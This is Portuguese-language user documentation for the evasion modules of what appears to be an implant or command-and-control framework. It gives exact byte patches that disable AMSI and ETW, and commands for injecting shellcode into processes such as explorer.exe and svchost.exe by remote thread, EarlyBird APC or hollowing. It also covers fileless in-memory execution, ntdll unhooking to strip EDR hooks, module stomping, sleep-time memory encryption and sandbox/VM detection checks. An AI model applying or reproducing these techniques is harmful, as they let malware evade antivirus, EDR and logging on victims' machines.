    Evasao¶

    Modulos para evasao de defesas: bypass de seguranca, injecao de processos, execucao in-memory, unhooking e obfuscacao.

    Resumo¶

    Modulo Plataformas Descricao
    amsi_bypass Windows Bypass de AMSI via patch ou hardware breakpoint
    etw_bypass Windows Bypass de ETW via patch ou hardware breakpoint
    process_inject Windows, Linux, macOS Injecao de shellcode (CRT, EarlyBird, Hollowing)
    memexec Windows, Linux, macOS Execucao in-memory de binarios
    direct_syscall Windows Resolucao e uso de syscalls diretas
    ntdll_unhook Windows Restauracao de ntdll.dll original
    module_stomp Windows Execucao via module stomping

    Componentes internos (nao expostos como modulo):

    Componente Plataformas Descricao
    SleepObfuscator Windows, Linux Criptografia de memoria durante sleep
    SandboxDetector Windows, Linux, macOS Deteccao de ambiente sandbox/VM

    amsi_bypass¶

    Nome: amsi_bypass Plataformas: Windows Descricao: Desabilita o Antimalware Scan Interface (AMSI) patchando AmsiScanBuffer em amsi.dll.

    Argumentos¶

    Nome Tipo Obrigatorio Default Descricao
    action string opcional patch Acao: patch ou check
    strategy string opcional auto Estrategia: auto, patch ou hwbp

    Estrategias¶

    Estrategia Descricao
    auto Tenta hardware breakpoint primeiro; fallback para patch
    patch Patch direto: sobrescreve AmsiScanBuffer com mov eax, 0x80070057; ret
    hwbp Hardware breakpoint: usa debug registers (DR0-DR3) para interceptar sem modificar bytes

    Retorno¶

    {
  "output": "AMSI bypass applied successfully (patched 6 bytes)",
  "data": {
    "status": "success",
    "patched_bytes": "6"
  }
}

    Exemplo de uso¶

    # Bypass automatico (hwbp com fallback para patch)
module amsi_bypass

# Forcar hardware breakpoint
module amsi_bypass --strategy hwbp

# Verificar se modulo esta pronto
module amsi_bypass --action check

    Notas¶

    • O patch 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 faz AmsiScanBuffer retornar E_INVALIDARG, que e tratado como "limpo" pelo caller
    • hwbp e mais evasivo: nao modifica bytes em memoria (sem deteccao por integridade de memoria)
    • Deve ser executado antes de carregar PowerShell ou .NET assemblies
    • Nao persiste entre reinicializacoes -- precisa ser re-aplicado

    etw_bypass¶

    Nome: etw_bypass Plataformas: Windows Descricao: Desabilita Event Tracing for Windows (ETW) patchando EtwEventWrite em ntdll.dll.

    Argumentos¶

    Nome Tipo Obrigatorio Default Descricao
    action string opcional patch Acao: patch ou check
    strategy string opcional auto Estrategia: auto, patch ou hwbp

    Estrategias¶

    Estrategia Descricao
    auto Tenta hardware breakpoint primeiro; fallback para patch
    patch Patch direto: sobrescreve EtwEventWrite com xor eax, eax; ret (return STATUS_SUCCESS)
    hwbp Hardware breakpoint: intercepta sem modificar bytes

    Retorno¶

    {
  "output": "ETW bypass applied successfully (patched 3 bytes)",
  "data": {
    "status": "success",
    "patched_bytes": "3"
  }
}

    Exemplo de uso¶

    # Bypass automatico
module etw_bypass

# Forcar patch direto
module etw_bypass --strategy patch

# Verificar status
module etw_bypass --action check

    Notas¶

    • O patch 0x33, 0xC0, 0xC3 (xor eax, eax; ret) faz EtwEventWrite retornar sucesso sem registrar nada
    • Desabilita telemetria do .NET CLR, PowerShell ScriptBlock Logging e outros providers ETW
    • Deve ser combinado com amsi_bypass para evasao completa de telemetria
    • Nao persiste entre reinicializacoes

    process_inject¶

    Nome: process_inject Plataformas: Windows, Linux, macOS Descricao: Injeta shellcode em um processo alvo usando diferentes tecnicas.

    Argumentos¶

    Nome Tipo Obrigatorio Default Descricao
    technique string opcional crt Tecnica: crt, earlybird ou hollowing
    shellcode string (hex) obrigatorio - Shellcode codificado em hexadecimal
    pid string (int) condicional - PID do processo alvo (para crt)
    name string condicional - Nome do processo alvo (para crt, resolvido para PID)
    target string condicional - Caminho do executavel (para earlybird e hollowing)

    Tecnicas¶

    Tecnica Plataformas Descricao
    crt Windows, Linux, macOS CreateRemoteThread (Win) / ptrace (Linux) / Mach APIs (macOS)
    earlybird Windows Cria processo suspenso, injeta via APC na thread principal
    hollowing Windows Substitui a imagem do processo com payload

    Retorno¶

    {
  "output": "successfully injected 256 bytes into PID 1234 via CRT",
  "data": {
    "pid": "1234",
    "status": "success",
    "size": "256",
    "technique": "crt"
  }
}

    Exemplo de uso¶

    # CRT por PID
module process_inject --pid 1234 --shellcode fc4883e4f0e8...

# CRT por nome
module process_inject --name explorer.exe --shellcode fc4883e4f0e8...

# EarlyBird APC
module process_inject --technique earlybird --target "C:\Windows\System32\svchost.exe" --shellcode fc4883e4f0e8...

# Process Hollowing
module process_inject --technique hollowing --target "C:\Windows\System32\notepad.exe" --shellcode fc4883e4f0e8...

    Notas¶

    • CRT: para crt, pid ou name deve ser fornecido (pid tem precedencia)
    • EarlyBird: cria processo em estado suspenso com CREATE_SUSPENDED, injeta shellcode e enfileira APC
    • Hollowing: cria processo suspenso, desmapeia a imagem original e mapeia o payload
    • Shellcode deve ser hex-encoded (sem prefixo 0x)
    • PID 0 e rejeitado como alvo invalido

    memexec¶

    Nome: memexec Plataformas: Windows, Linux, macOS Descricao: Carrega e executa binarios (PE/ELF) inteiramente em memoria, sem gravar em disco.

    Argumentos¶

    Nome Tipo Obrigatorio Default Descricao
    binary string (base64) obrigatorio - Binario codificado em base64
    args string opcional - Argumentos separados por espaco

    Implementacao por Plataforma¶

    Plataforma Tecnica
    Windows Mapeamento PE em memoria + CreateThread
    Linux memfd_create + fexecve (fileless ELF)
    macOS Fork + exec via file descriptor em memoria

    Retorno¶

    {
  "output": "stdout + stderr do binario executado",
  "data": {
    "status": "success",
    "size": "524288"
  }
}

    Exemplo de uso¶

    # Executar binario em memoria
module memexec --binary <base64_pe_or_elf>

# Com argumentos
module memexec --binary <base64_binary> --args "-scan -target 10.0.0.0/24"

    Notas¶

    • Nenhum arquivo e gravado em disco -- evasao de AV baseado em assinaturas de arquivo
    • O binario deve ser compativel com a plataforma do agent
    • No Linux, memfd_create cria um file descriptor anonimo em memoria (requer kernel 3.17+)
    • Combinavel com direct_syscall e ntdll_unhook para evasao maxima

    direct_syscall¶

    Nome: direct_syscall Plataformas: Windows Descricao: Resolve System Service Numbers (SSN) de ntdll.dll em disco e disponibiliza syscalls diretas para outros modulos.

    Argumentos¶

    Nenhum argumento necessario.

    Retorno¶

    {
  "output": "resolved syscall numbers from ntdll on disk:\n  NtAllocateVirtualMemory: 0x0018\n  ...",
  "data": {
    "status": "success",
    "count": "15",
    "NtAllocateVirtualMemory": "0x0018",
    "NtWriteVirtualMemory": "0x003A"
  }
}

    Exemplo de uso¶

    module direct_syscall

    Notas¶

    • Resolve SSNs parseando ntdll.dll do disco (nao a copia em memoria, que pode estar hooked)
    • Os SSNs resolvidos ficam disponiveis na SyscallTable para uso por outros modulos (process_inject, memexec)
    • Usado como biblioteca interna mais do que como modulo standalone
    • Padrao SSN: busca o pattern mov r10, rcx; mov eax, <SSN> no export do ntdll
    • Thread-safe: a SyscallTable usa sync.RWMutex

    ntdll_unhook¶

    Nome: ntdll_unhook Plataformas: Windows Descricao: Restaura a secao .text do ntdll.dll em memoria a partir de uma copia limpa carregada do disco.

    Argumentos¶

    Nenhum argumento necessario.

    Retorno¶

    {
  "output": "ntdll.dll .text section restored from clean copy",
  "data": { "status": "unhooked" }
}

    Exemplo de uso¶

    module ntdll_unhook

    Notas¶

    • Carrega uma copia limpa de ntdll.dll via NtCreateSection + NtMapViewOfSection
    • Copia a secao .text da copia limpa sobre a secao hooked em memoria
    • Remove hooks de EDR/AV que interceptam chamadas NT
    • Deve ser executado antes de modulos que dependem de NT APIs nao-hooked
    • Combinavel com direct_syscall para evasao completa da cadeia de hooks

    module_stomp¶

    Nome: module_stomp Plataformas: Windows Descricao: Executa shellcode sobrescrevendo a secao .text de uma DLL legitima carregada em memoria.

    Argumentos¶

    Nome Tipo Obrigatorio Default Descricao
    shellcode string (hex) obrigatorio - Shellcode codificado em hexadecimal
    target_dll string opcional - DLL alvo para stomping

    Retorno¶

    {
  "output": "payload executed via module stomping (4096 bytes)",
  "data": {
    "target_dll": "combase.dll",
    "size": "4096"
  }
}

    Exemplo de uso¶

    # Module stomping com DLL especifica
module module_stomp --shellcode fc4883e4f0e8... --target_dll combase.dll

    Notas¶

    • O shellcode e gravado sobre a secao .text de uma DLL ja carregada no processo
    • Para ferramentas de analise de memoria, o shellcode parece ser codigo da DLL legitima
    • Escolher DLLs que nao serao chamadas apos o stomping para evitar crashes
    • O tamanho do shellcode nao pode exceder o tamanho da secao .text da DLL alvo

    Componentes Internos¶

    SleepObfuscator¶

    Criptografa regioes de memoria writable durante periodos de sleep para evitar deteccao por memory scanners.

    Plataforma Tecnica
    Windows AES-256-CTR com VirtualProtect (PAGE_NOACCESS durante sleep)
    Linux XOR com mprotect (PROT_READ durante sleep)
    macOS Nao implementado (sleep padrao)

    Windows: criptografa secoes .data, .rdata, .bss do PE + buffers registrados explicitamente. Linux: criptografa regioes rw-p anonimas do /proc/self/maps (exclui stack, vdso, vvar).

    Uso: SleepObfuscator.ObfuscatedSleep(duration) -- chamado automaticamente pelo loop principal do implant.

    SandboxDetector¶

    Sistema de deteccao de sandbox/VM com checks pontuados (scored):

    Check Descricao
    CPU count Minimo 2 CPUs
    RAM Minimo 2 GB
    Uptime Minimo 20 minutos
    MAC address Detecta prefixos de VM (VMware, VirtualBox, Hyper-V, QEMU)
    User activity Sessao de usuario ativa
    Disk size Minimo 50 GB
    Installed programs Quantidade minima de programas
    GPU Presenca de GPU real
    Sleep acceleration Detecta aceleracao de sleep (sandbox fast-forward)
    User artifacts Arquivos e historico de usuario

    Acoes configuradas para deteccao: exit, sleep (longo) ou ignore.

    MAC prefixos de VM detectados: 00:05:69 (VMware), 00:0c:29 (VMware), 00:1c:14 (VMware), 00:50:56 (VMware), 08:00:27 (VirtualBox), 00:15:5d (Hyper-V), 52:54:00 (QEMU/KVM).
